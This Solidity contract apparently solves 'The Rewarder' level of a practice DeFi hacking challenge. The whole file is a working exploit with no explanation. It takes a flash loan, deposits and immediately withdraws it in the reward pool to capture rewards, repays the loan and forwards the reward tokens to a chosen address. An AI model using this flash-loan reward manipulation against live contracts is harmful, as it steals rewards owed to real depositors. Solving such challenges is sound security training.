// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import "../the-rewarder/AccountingToken.sol";
// import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

error AttackTheRewarder__NonExistentAmount();
error AttackTheRewarder__NoReward();
error justChecking();

contract AttackTheRewarder {
    FlashLoanerPool flashLoanerPool;
    TheRewarderPool rewarderPool;
    address liquidityTokenAddress;
    IERC20 liquidityToken;
    IERC20 rewardToken;

    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        address _liquidityToken,
        address _rewardToken
    ) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityTokenAddress = _liquidityToken;
        liquidityToken = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
    }

    function attack(uint256 amount, address receiverAddress) public {
        flashLoanerPool.flashLoan(amount);

        uint256 rewardAmount = rewardToken.balanceOf(address(this));

        rewardToken.transfer(receiverAddress, rewardAmount);
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

    receive() external payable {}
}
